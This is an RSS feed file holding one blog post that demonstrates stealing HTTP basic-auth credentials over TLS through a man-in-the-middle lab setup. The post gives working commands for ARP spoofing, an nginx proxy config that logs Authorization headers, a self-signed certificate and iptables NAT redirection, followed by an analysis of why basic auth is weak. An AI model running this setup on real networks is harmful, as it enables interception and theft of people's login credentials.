@@ -1,0 +1,220 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+	<channel>
+		<title>Testing 1...2...3...</title>
+		<description></description>
+		<link></link>
+		<atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
+		
+			<item>
+				<title>Why SSL is Not Enough to Save Basic Auth</title>
+				<description>&lt;p&gt;Basic Authentication is a known flawed mechanism, the oft quoted insecurities are (among others):&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;The credentials are sent in cleartext (base64 is encoding, not encryption).&lt;/li&gt;
+  &lt;li&gt;The credentials are sent with every request.&lt;/li&gt;
+  &lt;li&gt;The credentials are cached by the web browser until the process exits, and sometimes longer.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Initially I thought these would all be corrected if basic auth was layered on top of SSL/TLS.  While that gets you 90% of the way there, it’s still possible to find weaknesses.&lt;/p&gt;
+
+&lt;h1 id=&quot;the-setup&quot;&gt;The Setup&lt;/h1&gt;
+&lt;p&gt;VICTIM: 192.168.11.174&lt;br /&gt;
+SERVER: 192.168.11.180&lt;br /&gt;
+ATTACKER: 192.168.11.40&lt;/p&gt;
+
+&lt;p&gt;SERVER hosts an HTTPS webserver protected with basic authentication, which CLIENT wants to access.&lt;/p&gt;
+
+&lt;h1 id=&quot;requirements&quot;&gt;Requirements&lt;/h1&gt;
+
+&lt;p&gt;For this attack to work, the adversary must be able to man in the middle the victim.  The exact method isn’t important, as long as the traffic is intercepted.  I’ll be using ARP poisoning and NGINX HTTP proxy.&lt;/p&gt;
+
+&lt;p&gt;The victim must ignore an invalid certificate warning, or at least be curious enough to click past it.&lt;/p&gt;
+
+&lt;h1 id=&quot;configuring-your-mitm&quot;&gt;Configuring your MitM&lt;/h1&gt;
+&lt;h2 id=&quot;http-proxy&quot;&gt;HTTP Proxy&lt;/h2&gt;
+&lt;p&gt;Pick your proxy, NGINX works great, but any will do.  After installing it, you’ll need to make two modifications:&lt;/p&gt;
+
+&lt;p&gt;1) Add this line to /etc/nginx/nginx.conf in the http block&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-conf&quot; data-lang=&quot;conf&quot;&gt;&lt;table style=&quot;border-spacing: 0&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot; style=&quot;text-align: right&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
+2
+3&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;n&quot;&gt;log_format&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;basic_auth&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'$remote_addr - $remote_user [$time_local] '&lt;/span&gt;
+                    &lt;span class=&quot;s1&quot;&gt;'&quot;$request&quot; $status $body_bytes_sent '&lt;/span&gt;
+                    &lt;span class=&quot;s1&quot;&gt;'&quot;$http_referer&quot; &quot;$http_user_agent&quot; &quot;$http_authorization&quot;'&lt;/span&gt;;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;2) Create a new file at /etc/nginx/conf.d/00-default.conf with the following, and update lines 11, 38 with the SERVER IP.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-conf&quot; data-lang=&quot;conf&quot;&gt;&lt;table style=&quot;border-spacing: 0&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot; style=&quot;text-align: right&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;n&quot;&gt;server&lt;/span&gt; {
+        &lt;span class=&quot;n&quot;&gt;listen&lt;/span&gt;   &lt;span class=&quot;m&quot;&gt;80&lt;/span&gt;;
+
+        &lt;span class=&quot;n&quot;&gt;access_log&lt;/span&gt; /&lt;span class=&quot;n&quot;&gt;var&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;nginx&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;mitm&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;access&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;basic_auth&lt;/span&gt;;
+
+        &lt;span class=&quot;n&quot;&gt;location&lt;/span&gt; / {
+               &lt;span class=&quot;n&quot;&gt;proxy_set_header&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;X&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;Real&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;  $&lt;span class=&quot;n&quot;&gt;remote_addr&lt;/span&gt;;
+               &lt;span class=&quot;n&quot;&gt;proxy_set_header&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;X&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;Forwarded&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;For&lt;/span&gt; $&lt;span class=&quot;n&quot;&gt;proxy_add_x_forwarded_for&lt;/span&gt;;
+               &lt;span class=&quot;n&quot;&gt;proxy_set_header&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Host&lt;/span&gt; $&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;;
+
+               &lt;span class=&quot;n&quot;&gt;proxy_pass&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;://&lt;span class=&quot;m&quot;&gt;192&lt;/span&gt;.&lt;span class=&quot;m&quot;&gt;168&lt;/span&gt;.&lt;span class=&quot;m&quot;&gt;11&lt;/span&gt;.&lt;span class=&quot;m&quot;&gt;180&lt;/span&gt;/;
+        }
+}
+&lt;span class=&quot;n&quot;&gt;server&lt;/span&gt; {
+        &lt;span class=&quot;n&quot;&gt;listen&lt;/span&gt;   &lt;span class=&quot;m&quot;&gt;443&lt;/span&gt;;
+
+        &lt;span class=&quot;n&quot;&gt;ssl_certificate&lt;/span&gt; /&lt;span class=&quot;n&quot;&gt;etc&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;nginx&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;ssl&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;cert&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;pem&lt;/span&gt;;
+        &lt;span class=&quot;n&quot;&gt;ssl_certificate_key&lt;/span&gt; /&lt;span class=&quot;n&quot;&gt;etc&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;nginx&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;ssl&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;pem&lt;/span&gt;;
+
+        &lt;span class=&quot;n&quot;&gt;ssl&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;on&lt;/span&gt;;
+        &lt;span class=&quot;n&quot;&gt;ssl_session_cache&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;builtin&lt;/span&gt;:&lt;span class=&quot;m&quot;&gt;1000&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shared&lt;/span&gt;:&lt;span class=&quot;n&quot;&gt;SSL&lt;/span&gt;:&lt;span class=&quot;m&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;;
+        &lt;span class=&quot;n&quot;&gt;ssl_protocols&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TLSv1&lt;/span&gt;.&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TLSv1&lt;/span&gt;.&lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;;
+        &lt;span class=&quot;n&quot;&gt;ssl_ciphers&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH'&lt;/span&gt;;
+        &lt;span class=&quot;n&quot;&gt;ssl_prefer_server_ciphers&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;on&lt;/span&gt;;
+
+        &lt;span class=&quot;n&quot;&gt;access_log&lt;/span&gt; /&lt;span class=&quot;n&quot;&gt;var&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;nginx&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;mitm&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;access&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;basic_auth&lt;/span&gt;;
+
+        &lt;span class=&quot;n&quot;&gt;add_header&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;X&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;Frame&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;Options&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;SAMEORIGIN&quot;&lt;/span&gt;;
+        &lt;span class=&quot;n&quot;&gt;add_header&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;X&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;Content&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;Type&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;Options&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nosniff&lt;/span&gt;;
+        &lt;span class=&quot;n&quot;&gt;add_header&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;X&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;XSS&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;Protection&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;1; mode=block&quot;&lt;/span&gt;;
+
+        &lt;span class=&quot;n&quot;&gt;location&lt;/span&gt; / {
+                &lt;span class=&quot;n&quot;&gt;proxy_set_header&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;X&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;Real&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;  $&lt;span class=&quot;n&quot;&gt;remote_addr&lt;/span&gt;;
+                &lt;span class=&quot;n&quot;&gt;proxy_set_header&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;X&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;Forwarded&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;For&lt;/span&gt; $&lt;span class=&quot;n&quot;&gt;proxy_add_x_forwarded_for&lt;/span&gt;;
+                &lt;span class=&quot;n&quot;&gt;proxy_set_header&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Host&lt;/span&gt; $&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;;
+                &lt;span class=&quot;n&quot;&gt;proxy_set_header&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;X&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;Forwarded_Proto&lt;/span&gt; $&lt;span class=&quot;n&quot;&gt;scheme&lt;/span&gt;;
+
+                &lt;span class=&quot;n&quot;&gt;proxy_pass&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;://&lt;span class=&quot;m&quot;&gt;192&lt;/span&gt;.&lt;span class=&quot;m&quot;&gt;168&lt;/span&gt;.&lt;span class=&quot;m&quot;&gt;11&lt;/span&gt;.&lt;span class=&quot;m&quot;&gt;180&lt;/span&gt;/;
+        }
+}&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h2 id=&quot;generate-the-certificate&quot;&gt;Generate the Certificate&lt;/h2&gt;
+&lt;p&gt;Next create a self-signed certificate, try to match the fields as closely as possible to the server.  But if the victim goes as far as inspecting the certificate, you’ve probably already lost.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;…and move it to the correct location…&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;mkdir /etc/nginx/ssl
+mv key.pem /etc/nginx/ssl
+mv cert.pem /etc/nginx/ssl&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h2 id=&quot;poison-the-arp-tables&quot;&gt;Poison the ARP Tables&lt;/h2&gt;
+&lt;p&gt;I used arpspoof to poison the victims arp table, the syntax is: &lt;code class=&quot;highlighter-rouge&quot;&gt;arpspoof -i &amp;lt;interface&amp;gt; -t &amp;lt;victim&amp;gt; &amp;lt;server&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;arpspoof -i eth0 -t 192.168.11.174 192.168.11.180
+0:c:29:32:8:71 0:c:29:a3:f4:b2 0806 42: arp reply 192.168.11.180 is-at 0:c:29:32:8:71
+0:c:29:32:8:71 0:c:29:a3:f4:b2 0806 42: arp reply 192.168.11.180 is-at 0:c:29:32:8:71
+. . .&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h2 id=&quot;create-iptables-rules&quot;&gt;Create IPTABLES Rules&lt;/h2&gt;
+&lt;p&gt;At this point VICTIM will be sending Ethernet frames destined for SERVER to ATTACKER.  When these frames are unpackaged and sent up the stack, the IP header will show a destination IP which does not match its own, and the packet will be discarded.&lt;/p&gt;
+
+&lt;p&gt;One solution is to set the IP of SERVER on ATTACKER.  Though you’d also have to do some work to prevent an IP conflict, or risk further announcing your presence.&lt;/p&gt;
+
+&lt;p&gt;The better way is to NAT these packets:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# for any outgoing packet with a destination of 192.168.11.174 (victim), change the source to 192.168.11.180 (server)&lt;/span&gt;
+iptables -t nat -A POSTROUTING -o eth0 --destination 192.168.11.174/32 -j SNAT --to 192.168.11.180
+&lt;span class=&quot;c&quot;&gt;# for any incoming packet with source 192.168.11.174 (victim), change the destination to 192.168.11.40 (attacker)&lt;/span&gt;
+iptables -t nat -A PREROUTING -i eth0 --source 192.168.11.174/32 -j DNAT --to 192.168.11.40&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h1 id=&quot;the-method&quot;&gt;The Method&lt;/h1&gt;
+
+&lt;h2 id=&quot;new-session&quot;&gt;New Session&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;/images/client-server-new.png&quot; alt=&quot;new session&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;VICTIM requests &lt;code class=&quot;highlighter-rouge&quot;&gt;https://SERVER/&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;SERVER responses with a &lt;code class=&quot;highlighter-rouge&quot;&gt;401 Unauthorized&lt;/code&gt;, and includes header: &lt;code class=&quot;highlighter-rouge&quot;&gt;WWW-Authenticate: Basic realm=&quot;&amp;lt;realm&amp;gt;&quot;&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;VICTIM’s browser prompts for credentials, then requests https://SERVER/ and includes header: &lt;code class=&quot;highlighter-rouge&quot;&gt;Authorization: Basic &amp;lt;base64(username:password)&amp;gt;&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;SERVER confirms valid credentials and responds with webpage&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;existing-session&quot;&gt;Existing Session&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;/images/client-server-existing.png&quot; alt=&quot;existing session&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;VICTIM requests https://SERVER/ and automatically includes header: &lt;code class=&quot;highlighter-rouge&quot;&gt;Authorization: Basic &amp;lt;base64(username:password)&amp;gt;&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;SERVER confirms valid credentials and responds with webpage&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;intercepting-an-existing-session&quot;&gt;Intercepting an Existing Session&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;/images/client-server-existing-intercept.png&quot; alt=&quot;existing session intercept&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;VICTIM resolves IP address to MAC address&lt;/li&gt;
+  &lt;li&gt;ATTACKER responds to ARP request with it’s own MAC address.&lt;/li&gt;
+  &lt;li&gt;VICTIM sends request for https://SERVER/ and includes header: &lt;code class=&quot;highlighter-rouge&quot;&gt;Authorization: Basic &amp;lt;base64(username:password)&amp;gt;&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;ATTACKER logs &lt;code class=&quot;highlighter-rouge&quot;&gt;base64(username:password)&lt;/code&gt;, and proxies traffic to SERVER&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;is-this-feasible&quot;&gt;Is This Feasible?&lt;/h1&gt;
+&lt;p&gt;Essentially this boils down to one question: will the victim click past the certificate warning?&lt;/p&gt;
+
+&lt;p&gt;If not, well, then this won’t work.&lt;/p&gt;
+
+&lt;p&gt;But if they will, just once, then this attack can be very nearly transparent.  Consider the following scenario:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;VICTIM loads webpage and authenticates via basic auth&lt;/li&gt;
+  &lt;li&gt;ATTACKER begins ARP spoofing and proxying traffic&lt;/li&gt;
+  &lt;li&gt;VICTIM navigates the page, gets a certificate warning, and clicks past&lt;/li&gt;
+  &lt;li&gt;ATACKER, now that credentials have been obtained, stops the attack&lt;/li&gt;
+  &lt;li&gt;VICTIM continues to navigate, no longer gets a certificate warning, and leaves no trace of the attack&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The ATTACKER now has credentials, which will allow access until they are changed.&lt;/p&gt;
+
+&lt;p&gt;In doing this research, I’ve found the cause of the weaknesses in basic auth.  Consider a standard web application: users authenticate by sending their credentials over SSL/TLS, and in return they get a session ID to use with every subsequent request.  This is very similar to basic auth, yet it’s considered secure.  So what’s the difference?  The difference is that basic auth uses credentials for both authentication and session tracking.  While a true session ID might timeout after 15 minutes, credentials will not.&lt;/p&gt;
+
+&lt;h1 id=&quot;references&quot;&gt;References&lt;/h1&gt;
+&lt;p&gt;&lt;a href=&quot;https://tools.ietf.org/html/rfc7617&quot;&gt;RFC7617&lt;/a&gt;&lt;/p&gt;
+
+</description>
+				<pubDate>Wed, 09 Nov 2016 11:25:06 -0500</pubDate>
+				<link>/2016/11/Stealing-Basic-Auth-Credentials</link>
+				<guid isPermaLink="true">/2016/11/Stealing-Basic-Auth-Credentials</guid>
+			</item>
+		
+	</channel>
+</rss>
